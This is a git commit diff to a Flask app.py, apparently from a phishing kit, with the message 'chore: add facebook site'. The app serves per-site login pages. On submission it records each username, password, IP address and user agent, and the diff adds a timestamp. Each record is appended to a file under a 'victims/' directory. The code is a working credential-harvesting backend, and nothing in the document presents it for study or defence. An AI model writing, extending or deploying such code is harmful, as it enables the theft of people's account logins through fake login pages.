c274156f190800848b4eb08bde0dc8b52065ae0a
Saheb Giri <iamsahebgiri@gmail.com>
2024-02-01 18:37:35 +0530

    chore: add facebook site

--- app.py
+++ app.py
@@ -1,6 +1,7 @@
 from flask import Flask, request, render_template, redirect
 from werkzeug.middleware.proxy_fix import ProxyFix
 import csv
+from datetime import datetime
 
 app = Flask(
     __name__,
@@ -14,14 +15,15 @@ app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1)
 @app.route("/<site>", methods=["GET", "POST"])
 def login(site):
     if request.method == "POST":
-        url = request.form["url"]
+        url = request.form.get("url")
 
-        username = request.form["username"]
-        password = request.form["password"]
+        username = request.form.get("username")
+        password = request.form.get("password")
         ip = request.remote_addr
         user_agent = request.headers.get("User-Agent")
+        now = datetime.now()
 
-        data = [[username, password, ip, user_agent]]
+        data = [[username, password, ip, user_agent, now]]
         with open(f"victims/{site}.csv", mode="a", newline="") as file:
             writer = csv.writer(file)
             writer.writerows(data)
